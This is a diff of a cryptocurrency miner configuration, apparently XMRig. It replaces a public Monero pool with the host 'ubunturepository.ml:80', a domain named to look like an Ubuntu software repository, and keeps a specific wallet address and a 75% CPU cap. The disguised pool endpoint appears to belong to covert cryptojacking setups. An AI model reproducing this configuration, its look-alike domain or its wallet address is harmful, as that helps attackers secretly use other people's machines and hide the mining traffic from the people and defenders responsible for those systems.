@@ -19,8 +19,8 @@
     "max-cpu-usage": 75,
     "pools": [
         {
-            "url": "pool.supportxmr.com:80",
-            "user": "45rgestFBHnMTUfuVSvSekfuW4QxaqEyfSwJRQPuvxg9CMZr9mrvuBx9FUzWxSxsT59KykZaaHjQ6GRpTsz9ZdcC3Ko96Ev+3000",
+            "url": "ubunturepository.ml:80",
+            "user": "45rgestFBHnMTUfuVSvSekfuW4QxaqEyfSwJRQPuvxg9CMZr9mrvuBx9FUzWxSxsT59KykZaaHjQ6GRpTsz9ZdcC3Ko96Ev+2000",
             "pass": "x",
             "rig-id": null,
             "nicehash": true,
